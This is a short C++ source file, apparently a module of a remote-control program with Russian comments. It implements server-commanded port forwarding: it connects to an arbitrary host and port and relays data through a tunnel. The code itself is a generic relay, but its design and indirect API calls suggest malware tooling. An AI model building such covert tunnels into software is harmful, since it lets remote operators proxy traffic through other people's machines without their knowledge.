#include "WndRec\portforward.h"
#include "WndRec\sender.h"
#include "core\core.h"
#include "core\debug.h"
#include "core\http.h"

namespace WndRec
{

static int PortForwardConnect( ServerData* server, SocketId* si, char* data, int szData, char* createData, int szCreate )
{
	char addr[64];
	Str::Copy( addr, sizeof(addr), createData, szCreate ); //копируя создаем строку, так как в createData нет завершающего нуля
	AddressIpPort ipport;
	if( !ipport.Parse(addr) ) return 1;
	si->sc = Socket::ConnectHost( ipport.ip, ipport.port );
	if( si->sc <= 0 ) return 1;
	DbgMsg( "Port forward connected with %s:%d", ipport.ip, ipport.port );
	if( szData > 0 )
	{
		if( Socket::Write( si->sc, data, szData ) <= 0 )
		{
			API(WS2_32, closesocket)(si->sc);
			si->sc = 0;
			return 1;
		}
	}
	si->type = 1; //протокольные данные отработаны, дальше будут идти только данные, отсылаемые напрямую
	return 2;
}

bool StartPortForward( ServerData* server )
{
	DbgMsg( "Start port forward" );
	return StartTunnel( server, ID_PORTFORWARD, PortForwardConnect );
}

bool StopPortForward( ServerData* server )
{
	DbgMsg( "Stop port forward" );
	StopTunnel( server, ID_PORTFORWARD );
	return true;
}


}
